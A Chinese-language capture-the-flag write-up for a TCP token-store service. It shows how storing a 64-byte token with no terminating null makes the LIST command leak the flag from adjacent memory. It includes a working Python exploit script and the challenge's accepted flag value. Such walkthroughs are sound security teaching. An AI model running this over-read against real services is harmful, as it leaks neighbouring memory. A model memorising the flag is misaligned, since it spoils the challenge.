## 题目原文

> 一个基于 TCP 行协议的令牌存储服务，支持令牌的存储、查询与列举。请分析其实现，找出可利用的内存安全缺陷并读取受保护的 flag。

## 题解

### 入口与指纹

TCP 连上后横幅是 `Token Store v1.0`。`HELP` 给出 `STORE`、`CHECK`、`LIST`、`COUNT`、`QUIT`。每条命令一行，服务用 `>` 做提示符。

### 关键观察

每个令牌槽的可打印长度停在 63 字节。`STORE` 64 个 `A` 仍然回 `[OK] Token #0 stored`，但槽里没有留下结尾的 0。`LIST` 用的是一直读到 0 为止的打印，于是把槽后面的 flag 一起打出来。

32 字节的令牌 `LIST` 只显示那 32 个 `A`。64 字节时，`[LAST]` 行是 64 个 `A` 紧接着 `flag{...}`，中间没有分隔。

### 利用链

```bash
T=$(head -1 .target)
python3 - << PY
import socket
host, port = "$T".rsplit(":", 1)
s = socket.create_connection((host, int(port)), 6)
s.settimeout(2)
s.recv(4096)
s.sendall(b"STORE " + b"A"*64 + b"\\n")
s.recv(4096)
s.sendall(b"LIST\\n")
print(s.recv(4096))
PY
```

本次平台接受的值是 `flag{6455048a-4cb0-4b0a-9574-8521c2be0943}`。

### flag 位置

令牌槽后面的相邻内存。`LIST` 在令牌没有结尾 0 时把它读出来，出现在 `[LAST]` 那一行。
